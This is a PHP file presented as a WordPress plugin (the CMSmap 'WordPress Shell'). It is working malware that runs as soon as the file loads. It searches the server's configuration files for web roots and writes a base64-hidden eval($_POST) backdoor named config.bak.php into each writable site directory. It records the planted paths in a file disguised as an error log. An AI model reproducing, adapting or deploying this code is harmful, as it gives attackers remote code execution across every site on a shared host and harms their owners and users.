<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */

error_reporting(0);
ignore_user_abort(true);
header("content-Type: text/html; charset=gb2312");


function copy_file1($dest){
  file_put_contents($dest.DIRECTORY_SEPARATOR.'config.bak.php',base64_decode('PD9waHAgDQovKioNCiAqIFBsdWdpbiBOYW1lOiBDTVNtYXAgLSBXb3JkUHJlc3MgU2hlbGwNCiAqIFBsdWdpbiBVUkk6IGh0dHBzOi8vZ2l0aHViLmNvbS9tN3gvY21zbWFwLw0KICogRGVzY3JpcHRpb246IFNpbXBsZSBXb3JkUHJlc3MgU2hlbGwgLSBVc2FnZSBvZiBDTVNtYXAgZm9yIGF0dGFja2luZyB0YXJnZXRzIHdpdGhvdXQgcHJpb3IgbXV0dWFsIGNvbnNlbnQgaXMgaWxsZWdhbC4gSXQgaXMgdGhlIGVuZCB1c2VyJ3MgcmVzcG9uc2liaWxpdHkgdG8gb2JleSBhbGwgYXBwbGljYWJsZSBsb2NhbCwgc3RhdGUgYW5kIGZlZGVyYWwgbGF3cy4gRGV2ZWxvcGVyIGFzc3VtZXMgbm8gbGlhYmlsaXR5IGFuZCBpcyBub3QgcmVzcG9uc2libGUgZm9yIGFueSBtaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uDQogKiBWZXJzaW9uOiAxLjANCiAqIEF1dGhvcjogQ01TbWFwDQogKiBBdXRob3IgVVJJOiBodHRwczovL2dpdGh1Yi5jb20vbTd4L2Ntc21hcC8NCiAqIExpY2Vuc2U6IEdQTHYyDQogKi8NCmZvcmVhY2goJF9QT1NUIGFzICRrID0+ICR2KXsNCgkka2sgPSBAcGFjaygiSCoiLCAkayk7DQoJJF9QT1NUWyRra109QHBhY2soIkgqIiwgJHYpOw0KfQ0KQGV2YWwoJF9QT1NUWydwYXNzJ10pOw0KPz4NCnBvc3RwYXNzDQo='));

}
function finddir($dir){
	if($myfile = fopen($dir, "r")){
while(!feof($myfile)){
$myline = fgetss($myfile, 255);
if(strpos($myline, "ServerAlias")) {

$okurl=str_replace("ServerAlias","",$myline);
echo $okurl."<br>";
writeTxt('//'.$okurl.'/',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
}

if(strpos($myline, "DocumentRoot")) {
	$okdir=str_replace("DocumentRoot","",$myline);
	copy_file1($okdir);
               writeTxt('//'.$okdir.'/',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');

	
//echo $okdir."<br>";

}

}
fclose($myfile);
} 
	
	

}



function writeTxt($content,$fileurl){
    $fp=fopen($fileurl,"a+");
    if($fp){
        fwrite($fp,$content);
    }
    fclose($fp);
    
  }

function listDir($dir){
   if(is_dir($dir)){
     if ($dh = opendir($dir)) {
        while (($file= readdir($dh)) !== false){
		
       if((is_dir($dir."/".$file)) && $file!="." && $file!="..")
       {
	    if(is_writable($dir."/".$file)&&is_readable($dir."/".$file))
		{
		     if(strpos($dir.$file,'.') !== false){ 
			       	  
			       	  if(is_dir($dir.$file.'//wp-includes//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}
						if(is_dir($dir.$file.'//images//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}


			       	  if(is_dir($dir.$file.'//modules//')){
			       	  	copy_file1($dir.$file);
			       	  	writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> modules</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_dir($dir.$file.'//public_html//')){
			       	  	copy_file1($dir.$file.'//public_html//');
			       	  	writeTxt($dir.$file.'//public_html//',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> publichtml</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_file($dir.$file.'//index.php'))

{

copy_file1($dir.$file);
			       	  	writeTxt($dir.$file.'//index.php',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> indexok</font>"."<br><hr>";

}
			       	}
		}else{
		if(is_writable($dir."/".$file))
		{
			       
			       if(strpos($dir.$file,'.') !== false){ 
			       	  if(is_dir($dir.$file.'//wp-includes//')){
			       	  	 copy_file1($dir.$file);
			       	  	 writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> wpincludes</font>"."<br><hr>";
			       	  	}
			       	  if(is_dir($dir.$file.'//modules//')){
			       	  	copy_file1($dir.$file);
			       	  	writeTxt($dir.$file,$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> modules</font>"."<br><hr>";
			       	  	
			       	  	}
			       	  if(is_dir($dir.$file.'//public_html//')){
			       	  	copy_file1($dir.$file.'//public_html//');
			       	  	writeTxt($dir.$file.'//public_html//',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
			       	  	echo "<b><font color='red'>file:</font></b>".$dir.$file."<font color='red'> publichtml</font>"."<br><hr>";
			       	  	
			       	  	}
			       	}
              
		}else
		{
	      
		}
		}
		
		listDir($dir."/".$file."/");
       }
     
       }
        }
closedir($dh);

     }
 
   }


//$output = shell_exec('find / -name *.conf');
//writeTxt("<pre>$output</pre>",$_SERVER['DOCUMENT_ROOT'].'//php.errors.1og');  
//echo "<pre>$output</pre>";
$output=array();
exec('find / -name *.conf',$output);


foreach ($output as $value) {
  writeTxt('//'.$value.'/',$_SERVER['DOCUMENT_ROOT'].'//php_errors.1og');
  finddir($value);
}
   

//ListDir($_SERVER['DOCUMENT_ROOT'].'//..//..//..//..//..//');
?>
